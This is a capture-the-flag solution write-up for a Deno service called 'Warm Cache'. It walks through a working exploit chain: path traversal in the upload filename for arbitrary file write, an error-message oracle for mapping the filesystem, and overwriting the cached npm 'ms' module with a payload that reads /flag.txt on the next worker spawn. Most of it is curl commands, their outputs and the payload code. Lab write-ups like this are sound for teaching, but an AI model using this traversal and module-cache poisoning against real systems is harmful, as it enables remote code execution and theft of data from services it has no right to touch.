# Warm Cache — Solution

**Flag:** `RCC{c4ch3_p01s0n1ng_1s_4_wr1t3_pr1m1t1v3}`

A path-traversal **arbitrary file write** in `POST /upload` is turned into **remote code
execution** by overwriting an extracted **npm dependency in Deno's on-disk module cache**.
Each render job spawns a fresh worker that re-imports that dependency from disk, so the
next job runs attacker code — which reads `/flag.txt` and drops it where `/results/` will
serve it. No restart, no lockfile patching.

```
arbitrary write (/upload)  ─▶  overwrite /deno-dir/npm/.../ms/2.1.3/index.js
        │                                      │
        │                                      ▼
        │                      POST /jobs spawns a fresh Worker that imports ms
        ▼                                      │
   read /flag.txt  ◀──────── attacker code runs in the worker (--allow-read)
        │
        ▼
   write to /app/results/<name>  ─▶  GET /results/<name>  ─▶  flag
```

Set your target once:

```bash
TARGET=http://localhost:8000     # or the instance URL you were given
```

---

## 0. Recon the API

```bash
curl -s $TARGET/
```

Five routes: `POST /upload` (multipart, field `file`), `POST /jobs` (`{"ttl","note"}` →
renders in a worker), `GET /jobs/<id>`, `GET /results/<name>`, `GET /health`.

A normal job renders a fixed 4-line receipt into the results directory:

```bash
curl -s -X POST $TARGET/jobs -H 'content-type: application/json' \
  -d '{"ttl":"30s","note":"hello"}'
# -> {"id":"<8hex>","status":"done","output":"<8hex>.txt"}
curl -s $TARGET/results/<8hex>.txt
```

Note two things:

- The uploaded **file content is never used** by the renderer — only `note` (slugified)
  and `ttl` (parsed) appear in the receipt. So there is no file-read sink to abuse; you
  need code execution.
- `GET /results/<name>` is strictly validated (`^[A-Za-z0-9._-]{1,64}$`, rejects `..`),
  and Deno's HTTP layer normalizes `..` in the URL path anyway — the **read** side cannot
  reach `/flag.txt`. (If you "traverse" with `curl` and seem to get somewhere, that's
  curl normalizing client-side; use `curl --path-as-is` to see the truth.)

---

## 1. The write primitive: path traversal in `/upload`

`/upload` builds its destination by concatenating the multipart **filename** onto the
upload directory with no sanitization, then `mkdir -p`s the parent and writes. The filename
is fully attacker-controlled, so `../` escapes the upload directory.

Confirm it by writing into the results directory and reading it back:

```bash
printf 'TRAVERSAL_OK' > /tmp/probe.txt
curl -s -X POST $TARGET/upload \
  -F 'file=@/tmp/probe.txt;filename=../results/probe.txt'
# -> {"stored":"../results/probe.txt","bytes":12}
curl -s $TARGET/results/probe.txt      # -> TRAVERSAL_OK
```

You can now write **any file the service user can write**. (Watch out: an *absolute*
filename like `/tmp/x` is NOT absolute here — it gets appended under the upload dir. Only
`../` actually escapes. The `stored` field echoes your input, not where the bytes landed.)

---

## 2. Find the writable *code*: the Deno module cache

`/app` (the application code) is read-only to the service user, so you can't overwrite
`worker.ts`. You need a different writable location that holds code the service executes.

**Fingerprint the runtime.** Make the upload fail and read the error:

```bash
curl -s -X POST $TARGET/upload -F 'file=@/tmp/probe.txt;filename='        # empty name
# -> ... IsADirectory: Is a directory (os error 21): writefile '/app/uploads'
```

`<ErrorClass>: <libc msg> (os error N): <op> '<path>'` is **Deno's** error format
(writing to `/proc` even returns `NotCapable`, the class that replaced `PermissionDenied`
in Deno 2). So this is a Deno app, and Deno keeps its module cache in `$DENO_DIR`
(default `/deno-dir`).

**Map the filesystem with the upload-error oracle.** Because the handler `mkdir -p`s the
parent before writing, the *syscall named in the error* tells you what is at a path. Probe
`../X/probe` (and `../X` with no suffix):

| Response | Meaning |
|---|---|
| `AlreadyExists … mkdir '/app/X'` (os error 17) | `X` exists and is a **file** |
| `PermissionDenied … mkdir '/app/X'` (os error 13) | `X` does **not exist** |
| `PermissionDenied … writefile '/app/X/probe'` | `X` is a directory, **read-only** |
| `IsADirectory … writefile '/app/X'` (os error 21) | `X` is a directory (probe `../X` with no suffix) |
| `{"stored": …}` | `X` is a **writable** directory |

> Oracle gotcha: for a directory whose **parent is already writable**, `mkdir -p X/probe`
> succeeds whether or not `X` exists — so `../X/probe` can't tell you `X` is real. Use the
> **no-suffix** probe `filename=../X`: `os error 21 (IsADirectory)` means `X` pre-exists as
> a directory. This is the reliable way to confirm a cache dir vs. one your own probe made.

Probing from `/` outward, `/app` is read-only but **`/deno-dir` is writable** — that's the
"warm cache," and your write primitive reaches it.

---

## 3. Identify the dependency and its version

Both entrypoints `import ms from "ms"`. Deno lays extracted npm packages out at:

```
$DENO_DIR/npm/registry.npmjs.org/<package>/<version>/<main>
```

**Which package?** Make the duration parser describe itself:

```bash
curl -s -X POST $TARGET/jobs -H 'content-type: application/json' -d '{"ttl":"1y"}'
# retain: 31557600000ms  ==  365.25 days  ->  the "y" constant unique to npm `ms`
curl -s -X POST $TARGET/jobs -H 'content-type: application/json' -d '{"ttl":"1.5h"}'
# renders "2 hours"  ->  ms's 1.5x plural rounding
```

**Which version?** Confirm `ms/2.1.3` on disk with the no-suffix oracle:

```bash
curl -s -X POST $TARGET/upload -F 'file=@/tmp/probe.txt;filename=../../deno-dir/npm/registry.npmjs.org/ms/2.1.3'
# IsADirectory (os error 21)  ->  the directory exists
```

Target file: `/deno-dir/npm/registry.npmjs.org/ms/2.1.3/index.js`.

> **Easy mode (`VERBOSE_ERRORS=1`):** skip steps 2–3. A malformed `ttl` returns the
> worker's stack trace, which names the cache path outright:
> ```bash
> curl -s -X POST $TARGET/jobs -H 'content-type: application/json' -d '{"ttl":"not-a-duration"}'
> # Error ... at module.exports (file:///deno-dir/npm/registry.npmjs.org/ms/2.1.3/index.js:34:9)
> ```

---

## 4. Poison the cached module

Write a replacement for `index.js`. It reads the flag into the served results directory on
import, and **still exports a working `ms()`** so the render reports `done` and nothing
looks broken.

`payload.js`:

```js
// Poisoned replacement for npm:ms@2.1.3
try {
  const flag = globalThis.Deno.readTextFileSync("/flag.txt");
  globalThis.Deno.writeTextFileSync("/app/results/pwned.txt", flag);
} catch (e) {
  try { globalThis.Deno.writeTextFileSync("/app/results/pwned.txt", "ERR: " + e); } catch (_) {}
}

// Keep behaving like ms() so the receipt still renders successfully.
module.exports = function (val, opts) {
  if (typeof val === "string") return 30000;
  return (opts && opts.long) ? "30 seconds" : "30s";
};
```

Overwrite the cached file via the traversal (extra `../` are harmless — at `/` they
resolve to `/`, so you don't need to count directory depth):

```bash
curl -s -X POST $TARGET/upload \
  -F 'file=@payload.js;filename=../../deno-dir/npm/registry.npmjs.org/ms/2.1.3/index.js'
# -> {"stored":".../ms/2.1.3/index.js","bytes":...}
```

Nothing re-verifies it: `deno.lock`'s `integrity` is a sha512 over the downloaded
**tarball**, checked at extract time — not when the extracted file is later loaded.

---

## 5. Trigger a worker and read the flag

The long-running API process keeps its in-memory copy of `ms`, but **every `POST /jobs`
spawns a fresh worker that re-reads the module from disk** — so one more job runs your code.
No restart needed.

```bash
curl -s -X POST $TARGET/jobs -H 'content-type: application/json' -d '{"ttl":"30s","note":"go"}'
curl -s $TARGET/results/pwned.txt
# RCC{c4ch3_p01s0n1ng_1s_4_wr1t3_pr1m1t1v3}
```

---

## Why it works

- **Arbitrary write + unscoped permissions.** `/upload` trusts the multipart filename, and
  the service runs with blanket `--allow-read --allow-write`, so a traversal reaches the
  module cache and the injected code can read `/flag.txt` (owned by, and readable by, the
  same `deno` user).
- **Writable, trusted cache.** `DENO_DIR` is owned by the runtime user. Extracted npm files
  are executed on load with **no integrity re-check** — a single plaintext write is enough.
- **Workers are the no-restart trigger.** A fresh worker gets its own module graph and
  resolves imports from the cache at spawn time, so poisoning takes effect on the very next
  job while the parent keeps serving.
